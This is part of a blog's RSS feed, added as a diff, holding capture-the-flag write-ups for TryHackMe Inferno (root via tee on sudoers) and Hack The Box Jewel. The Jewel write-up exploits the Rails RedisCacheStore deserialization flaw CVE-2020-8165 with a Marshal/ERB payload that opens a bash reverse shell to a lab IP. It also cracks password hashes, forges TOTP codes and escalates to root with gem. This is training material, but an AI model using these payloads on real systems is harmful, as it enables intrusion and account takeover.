+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_9.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilage-escalation&quot;&gt;Privilage Escalation&lt;/h2&gt;
+
+&lt;p&gt;In this case we can exploit /usr/bin/tee and getting a root. I got this from &lt;a href=&quot;https://gtfobins.github.io/gtfobins/tee/#suid&quot;&gt;GTFObins&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Exploit : &lt;code&gt;$ echo &quot;dante ALL=(ALL) ALL&quot;| sudo tee -a /etc/sudoers o tee -a /etc/sudoers&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Since the dante user has full ‘tee’ access, we can edit all configuration files to get root&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_10.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we are root!!&lt;/p&gt;
+
+&lt;p&gt;Happy hacking :D&lt;/p&gt;
+</description>
+        <pubDate>Tue, 16 Feb 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-tryhackme-inferno/</link>
+        <guid isPermaLink="true">/writeup-tryhackme-inferno/</guid>
+        
+        <category>boot2root</category>
+        
+        <category>medium-box</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>cve</category>
+        
+        <category>web exploitation</category>
+        
+        <category>enumeration</category>
+        
+        
+        <category>Tryhackme</category>
+        
+        <category>Linux</category>
+        
+      </item>
+    
+      <item>
+        <title>Hackthebox Jewel</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;This is partical room from hackthebox entitled jewel with Medium difficulty. In this room we will learn about code analysis of a Ruby on Rails web application . This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user and in this room using oathtool for google authentication  . room link &lt;a href=&quot;https://tryhackme.com/room/enpass&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;First time we have to do is scanning the Machine :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo nmap 10.10.10.211 -sC -sV
+[sudo] password for razor: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 01:19 WIB
+Nmap scan report for 10.10.10.211
+Host is up (0.25s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
+|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
+|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
+8000/tcp open  http    Apache httpd 2.4.38
+|_http-generator: gitweb/2.20.1 git/2.20.1
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-title: 10.10.10.211 Git
+|_Requested resource was http://10.10.10.211:8000/gitweb/
+8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
+|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
+|_http-title: BL0G!
+Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.72 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;from the results issued by nmap we get 3 open ports where port 22 is ssh, port 8000 is apache webserver, and port 8080 is nginx. now lets check port 8000 first and look at sumarry&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg_2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is a git repo and we can download snapshot from this repository&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wget '10.10.10.211:8000/gitweb/?p=.git;a=snapshot;h=HEAD;sf=tgz' -O snapshot.tgz
+tar xvzf snapshot.tgz
+
+cd .git-5d6f436 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg_3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s take a look at this, Gemfile shows the version of rails which will be released in 2020. After I did some research I found a &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165&quot;&gt;CVE&lt;/a&gt; where we can deserialization vulnerability leading to RCE.&lt;/p&gt;
+
+&lt;p&gt;The vulnerability is indicated by the presence of the raw: true option code, which can trigger untrusted string deserialization in marshal. here I am using grep to find vulnerable code :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg_4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;here we can see the output of grep where there are 2 vulnerabilities here, such as:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;users_controller.rb
+    &lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt; def update
+  @user = User.find(params[:id])
+  if @user &amp;amp;&amp;amp; @user == current_user
+    cache = ActiveSupport::Cache::RedisCacheStore.new(url: &quot;redis://127.0.0.1:6379/0&quot;)
+    cache.delete(&quot;username_#{session[:user_id]}&quot;)
+    @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) {user_params[:username]}
+    if @user.update(user_params)
+      flash[:success] = &quot;Your account was updated successfully&quot;
+      redirect_to articles_path
+    else
+      cache.delete(&quot;username_#{session[:user_id]}&quot;)
+      render 'edit'
+    end
+  else
+    flash[:danger] = &quot;Not authorized&quot;
+    redirect_to articles_path
+  end
+end
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;application_controller.rb
+    &lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;def current_username
+  if session[:user_id]
+    cache = ActiveSupport::Cache::RedisCacheStore.new(url: &quot;redis://127.0.0.1:6379/0&quot;)
+    @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) do
+      @current_user = current_user
+      @current_username = @current_user.username
+    end
+  else
+    @current_username = &quot;guest&quot;
+  end
+  return @current_username
+end
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This method is an update that is called when the user updates and sets the username_id value without any checking and cleaning. After i did a search here i saw user.rb which contains code like username must be unique between 3 to 25 characters long and contain only alphanumeric characters&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;class User &amp;lt; ActiveRecord::Base
+ has_many :articles
+ has_secure_password
+ VALID_USER_REGEX = /\A[\w\d]+\z/
+ VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i
+ validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },
+                      format: { with: VALID_USER_REGEX }
+ validates :email, presence: true, length: { maximum: 105 }, uniqueness: { case_sensitive: false }, 
+                   format: { with: VALID_EMAIL_REGEX }
+ before_save { self.email = email.downcase }
+end
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This logic is very bad, because the serial marshal object is dangerous if set as the username, it is also written to the cache, and fails to update the database. Cached objects must be deleted immediately because no deletion will cause server errors and the operation to be aborted. this will allow the attacker to store arbitrary serial code and will trigger its deserialization which may result in code execution (RCE)&lt;/p&gt;
+
+&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
+
+&lt;p&gt;Vulnerability is in update profile user, we can register at here http://10.10.10.211:8080/signup. After that, click on profile and you can edit username&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg_5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After registration you can also login. Now lets install rails and go to folder then we can build payload based on github&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo apt install rails
+$ rails new ex
+$ cd ex
+$ rails console 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;before we go in console you must set Netcat listener for revershell in another terminal, if you done let’s build some payload :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; code='`/bin/bash -c &quot;bash -i &amp;amp;&amp;gt;/dev/tcp/10.10.14.54/4444 0&amp;gt;&amp;amp;1&quot;`'
+&amp;gt; erb=ERB.allocate
+&amp;gt; erb.instance_variable_set:@src, code
+&amp;gt; erb.instance_variable_set:@filename, &quot;1&quot;
+&amp;gt; erb.instance_variable_set:@lineno, 1
+&amp;gt; payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb,:result)
+&amp;gt; require'uri'
+&amp;gt; puts URI.encode_www_form(payload:payload)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg_6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now i have payload :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3E%60%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.54%2F4444+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now lets exploit this. in this case i’m using burpsuite to put the payload in username&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg_7.png&quot; alt=&quot;img&quot; /&gt;
+Before update user you must turn on intercept in burpsuite
+&lt;img src=&quot;/assets/htb_jewel/bg_8.png&quot; alt=&quot;img&quot; /&gt;
+change username to payload for revershell and after that you can forward and intercept of then look at your browser
+&lt;img src=&quot;/assets/htb_jewel/bg_9.png&quot; alt=&quot;img&quot; /&gt;
+in this case dont reload the page but just enter on address. then you must be getting a shell
+&lt;img src=&quot;/assets/htb_jewel/bg_10.png&quot; alt=&quot;img&quot; /&gt;
+Now we have user bill&lt;/p&gt;
+
+&lt;h2 id=&quot;privilage-escalation&quot;&gt;Privilage Escalation&lt;/h2&gt;
+
+&lt;p&gt;After I went around and did the enumeration of the file system I found this &lt;code&gt;/var/backups/dump_2020-08-27.sql &lt;/code&gt; and i found username and hash of password :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg_11.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo '$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW' &amp;gt; pas_hash
+echo '$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO' &amp;gt;&amp;gt; pas_hash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In this case im using &lt;code&gt;hashcat&lt;/code&gt; for crack the password :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg_12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and I managed to get one of those two hashes&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ hashcat -D 2 -m 3200 hashes ~/Documents/Wordlist/rockyou.txt --show                                      130 ⨯
+$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongebob
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;lets check this :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bill@jewel:~$ sudo -l
+[sudo] password for bill: 
+Verification code: 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;user using google authenticator and as you can see we have folder .google_authenticator
+&lt;img src=&quot;/assets/htb_jewel/bg_13.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we can use this secret key to generate OTP on our machines&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;apt install oathtool
+oathtool -b --totp '2UQI3R52WFCLE6JTLDCSJYMJH4
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/bg.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;note : your time must be the same as the time in the jewel machine, you can change it by means of timedatectl or date -s&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The GTFOBins repo provides an example of how this binary can be abused in order to get a root
+shell. &lt;a href=&quot;https://gtfobins.github.io/gtfobins/gem/#sudo&quot;&gt;Link&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;gem open -e &quot;/bin/sh -c /bin/sh&quot; rdoc&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb_jewel/root_flag.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Boom!!! We are root now&lt;/p&gt;
+
+&lt;p&gt;Happy hacking :D&lt;/p&gt;
+</description>
+        <pubDate>Mon, 15 Feb 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-hackthebox-jewel/</link>
+        <guid isPermaLink="true">/writeup-hackthebox-jewel/</guid>
+        
+        <category>boot2root</category>
+        
+        <category>custom exploitation</category>
+        
+        <category>medium-box</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>cve</category>
+        
+        <category>web exploitation</category>
+        
+        <category>enumeration</category>
+        
+        
+        <category>Hackthebox</category>
+        
+        <category>Linux</category>
+        
+      </item>
+    
+  </channel>
+</rss>
